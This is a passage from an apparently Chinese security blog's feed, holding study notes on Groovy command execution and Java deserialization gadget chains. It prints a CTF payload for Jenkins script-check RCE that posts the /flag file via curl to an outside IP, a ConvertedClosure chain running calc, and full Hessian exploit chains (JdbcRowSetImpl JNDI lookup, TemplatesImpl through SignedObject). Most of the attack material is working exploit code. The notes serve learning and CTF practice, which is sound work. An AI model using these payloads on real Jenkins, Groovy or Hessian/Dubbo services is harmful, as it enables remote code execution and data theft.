class="hljs-string">&#x27;calc&#x27;</span>.execute()&#125;</span>&quot;</span><span class="hljs-comment">// 回显型命令执行</span>println <span class="hljs-string">&quot;cmd /c dir&quot;</span>.execute().textprintln <span class="hljs-string">&#x27;whoami&#x27;</span>.execute().textprintln <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;<span class="hljs-string">&quot;whoami&quot;</span>.execute().text&#125;</span>&quot;</span>println <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;<span class="hljs-string">&#x27;whoami&#x27;</span>.execute().text&#125;</span>&quot;</span>def cmd = <span class="hljs-string">&quot;whoami&quot;</span>;println <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;cmd.execute().text&#125;</span>&quot;</span>;</code></pre></div><p>注意这里是groovy文件，而不是java文件</p><p>被坑了，我说咋不行</p><h3 id="ACTF2023-hooks"><a href="#ACTF2023-hooks" class="headerlink" title="ACTF2023 hooks"></a>ACTF2023 hooks</h3><p>就说相关的一步</p><p>jenkins的RCE用到groovy</p><p><a href="https://github.com/orangetw/awesome-jenkins-rce-2019">https://github.com/orangetw/awesome-jenkins-rce-2019</a></p><p><a href="https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/">https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/</a></p><p>那题要重定向，TEL✌的payload经过url解密之后长这样</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>jenkins:<span class="hljs-number">8080</span><span class="hljs-regexp">/securityRealm/u</span>ser<span class="hljs-regexp">/admin/</span>descriptorByName<span class="hljs-regexp">/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/</span>checkScript?value=public class x&#123;public x()&#123;<span class="hljs-string">&quot;curl 8.134.216.221:1234 -X POST -F xx=@/flag&quot;</span>.execute()&#125;&#125;</code></pre></div><p>可以看到就是利用这一特性</p><h2 id="Groovy反序列化链"><a href="#Groovy反序列化链" class="headerlink" title="Groovy反序列化链"></a>Groovy反序列化链</h2><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p>ConvertedCloure实际上是一个动态代理类，它继承了ConversionHandler</p><p>。。。算了，自己都不懂，看别人的吧</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;<span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.FileOutputStream;<span class="hljs-keyword">import</span> java.io.ObjectInputStream;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.lang.annotation.Target;<span class="hljs-keyword">import</span> java.lang.reflect.*;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException &#123;        <span class="hljs-comment">//封装我们需要执行的对象</span>        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">methodClosure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;execute&quot;</span>);        <span class="hljs-type">ConvertedClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConvertedClosure</span>(methodClosure, <span class="hljs-string">&quot;entrySet&quot;</span>);        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];        constructor.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-comment">// 创建 ConvertedClosure 的动态代理类实例</span>        <span class="hljs-type">Map</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, closure);        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./Groovy&quot;</span>));            outputStream.writeObject(invocationHandler);            outputStream.close();            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./Groovy&quot;</span>));            inputStream.readObject();        &#125;        <span class="hljs-keyword">catch</span>(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><p>大概的调用栈</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span>entry<span class="hljs-constructor">Set()</span> (Proxy)        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConversionHandler</span>.</span></span>invoke<span class="hljs-literal">()</span>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConvertedClosure</span>.</span></span>invoke<span class="hljs-constructor">Custom()</span>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MethodClosure</span>.</span></span>call<span class="hljs-literal">()</span>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProcessGroovyMethods</span>.</span></span>execute<span class="hljs-literal">()</span></code></pre></div><p>分析也看别人的吧</p><p>给出最后一步，也是利用doCall函数命令执行</p><p><img src="/../images/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240307223155817.png" alt="image-20240307223155817"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>能够命令执行的地方好像越来越看不懂了，从刚开始的反射比较容易，现在都不知道哪里可以命令执行，更不要说挖链子了</p><h2 id="每篇一言"><a href="#每篇一言" class="headerlink" title="每篇一言"></a>每篇一言</h2><p>即使他没有回头，我也一直在寻找他的身影，可我找到他，他却对我重拳出击，我不明白他突然为何这样对我，直到她的出现我才反应过来，他之所以离开，是因为他早已有了更好的人选，可我不想就此离去，我想击败她证明给他看，我才是最好的而我没有想到他为了她会选择阻拦我，甚至不惜收下我的性命</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="/2024/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个hessian反序列化和其他的反序列化有点不同，</p><p>这里就是序列化和反序列化不用<code>ObjectOutputStream</code>和<code>ObjectInputStream</code></p><p>改为使用对应的Hessian或Hessian2</p><div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.Hessian2Input;<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.Hessian2Output;<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.HessianInput;<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.HessianOutput;</code></pre></div><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h2 id="原生hessian反序列化链"><a href="#原生hessian反序列化链" class="headerlink" title="原生hessian反序列化链"></a>原生hessian反序列化链</h2><p>如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打下去</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HessianInput</span>.</span></span>readObject<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SerializeFactory</span>.</span></span>readMap        _hashMapDeserializer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">MapDeserializer(HashMap.<span class="hljs-params">class</span>)</span>;        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_hashMapDeserializer</span>.</span></span>read<span class="hljs-constructor">Map(<span class="hljs-params">in</span>)</span>;        map.put(<span class="hljs-keyword">in</span>.read<span class="hljs-constructor">Object()</span>, <span class="hljs-keyword">in</span>.read<span class="hljs-constructor">Object()</span>); <span class="hljs-comment">//入口就在这里</span></code></pre></div><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Hessian;<span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-keyword">import</span> java.lang.reflect.*;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.PriorityQueue;<span class="hljs-keyword">import</span> java.util.Queue;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:1099/exp&quot;</span>;        jdbcRowSet.setDataSourceName(url);        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);        <span class="hljs-comment">//手动生成HashMap，防止提前调用hashcode()</span>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean,<span class="hljs-string">&quot;1&quot;</span>);        <span class="hljs-type">byte</span>[] s = serialize(hashMap);        System.out.println(s);        System.out.println((HashMap)deserialize(s));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">( Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);        &#125;        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);        nodeCons.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);        <span class="hljs-keyword">return</span> s;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o)<span class="hljs-keyword">throws</span> IOException&#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);        output.writeObject(o);        output.close();        System.out.println(bao.toString());        <span class="hljs-keyword">return</span> bao.toByteArray();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><span class="hljs-keyword">throws</span> IOException&#123;        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(stream);        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();        <span class="hljs-keyword">return</span> (T) o;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj,String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-keyword">return</span> field.get(obj);    &#125;&#125;</code></pre></div><p>这样看起来好像和普通的使用<code>ObjectOutputStream</code>没什么区别</p><p>那下面这条链子区别就来了</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这是我们最经常使用的一个类</p><p>先说结果，直接用<code>HessianInput</code>到<code>TemplatesImpl</code>的链子是无法使用的</p><p>要使用jdk原生反序列化即<code>ObjectInputStream</code>才可以</p><p>因为<code>TemplateImpl</code>的<code>readObject</code>的最后一行有<code>_tfactory = new TransformerFactoryImpl();</code></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>但就<code>_tfactory </code>来说，他被<code>transient</code>修饰，无法通过序列化和反序列化传递数据</p><p>但是<code>TemplatesImpl</code>能使用的前提之一就是<code>_tfactory </code>的值为<code>new TransformerFactoryImpl();</code></p><p>我拿任意一个jackson链子下断点分析</p><p>断点就下在<code>_tfactory = new TransformerFactoryImpl();</code>这里</p><p>先看正常的<code>ObjectInputStream</code></p><p>然后就往前看调用栈，这里说不了什么，只能看代码</p><p>可以看到这三个调用栈调用了7次（不同链子不同</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png" alt="image-20240303220756669"></p><p>看完这三处的代码后可以知道，大概逻辑就是判断你的类有没有readObject方法，如果有则执行</p><p>并且他会判断你所有实例化的类，所以这里才调用了7次（按链条顺序依次判断</p><blockquote><p>大佬们的说法：</p><p>如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p></blockquote><p>也就是走到了<code>TemplatesImpl</code>的readObject的方法并把<code>_tfactory </code>的值赋值为<code>new TransformerFactoryImpl();</code></p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303222606860.png" alt="image-20240303222606860"></p><p>要是使用<code>HessianInput</code>的话就不会经过这里</p><p>导致最后要执行的<code>TemplatesImpl</code>对象的<code>_tfactory</code>仍为null，导致payload无法执行</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223332590.png" alt="image-20240303223332590"></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>利用SignedObject进行二次反序列化即可</p><p>因为他会利用<code>ObjectInputStream</code>再次进行反序列化</p><p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223907161.png" alt="image-20240303223907161"></p><div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> test &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        Templates templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;        advisedSupport.set<span class="hljs-constructor">Target(<span class="hljs-params">templatesimpl</span>)</span>;        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;        Templates proxyObj = (Templates) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);        POJONode jsonNodes2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;        BadAttributeValueExpException exp2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;        Field val2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        val2.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        val2.set(exp2,jsonNodes2);        KeyPairGenerator keyPairGenerator;        keyPairGenerator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KeyPairGenerator</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);        KeyPair keyPair = keyPairGenerator.gen<span class="hljs-constructor">KeyPair()</span>;        PrivateKey privateKey = keyPair.get<span class="hljs-constructor">Private()</span>;        Signature signingEngine = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Signature</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        SignedObject signedObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SignedObject(<span class="hljs-params">exp2</span>,<span class="hljs-params">privateKey</span>,<span class="hljs-params">signingEngine</span>)</span>;        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">signedObject</span>)</span>;        HotSwappableTargetSource h1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">jsonNodes</span>)</span>;        HotSwappableTargetSource h2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">new</span> XString(<span class="hljs-params">null</span>)</span>);        HashMap&lt;Object, Object&gt; objectObjectHashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">h1</span>, <span class="hljs-params">h2</span>)</span>;        deserialize(serialize(objectObjectHashMap));    &#125;    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        return s;    &#125;    public static &lt;T&gt; byte<span class="hljs-literal">[]</span> serialize(T o)throws IOException&#123;        ByteArrayOutputStream bao = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        HessianOutput output = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HessianOutput(<span class="hljs-params">bao</span>)</span>;        output.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;        output.close<span class="hljs-literal">()</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(bao.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);        return bao.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>;    &#125;    public static &lt;T&gt; T deserialize(byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span>)throws IOException&#123;        ByteArrayInputStream stream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">bytes</span>)</span>;        HessianInput input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HessianInput(<span class="hljs-params">stream</span>)</span>;        Object o = input.read<span class="hljs-constructor">Object()</span>;        return (T) o;    &#125;    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>,String <span class="hljs-params">name</span>,Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;    public static Object get<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>,String <span class="hljs-params">name</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return field.get(obj);    &#125;&#125;</code></pre></div><h2 id="apache-dubbo的hessian反序列化"><a href="#apache-dubbo的hessian反序列化" class="headerlink" title="apache dubbo的hessian反序列化"></a>apache dubbo的hessian反序列化</h2><p>dubbo使用的是alibaba修改过的hessian</p><div class="code-wrapper"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span 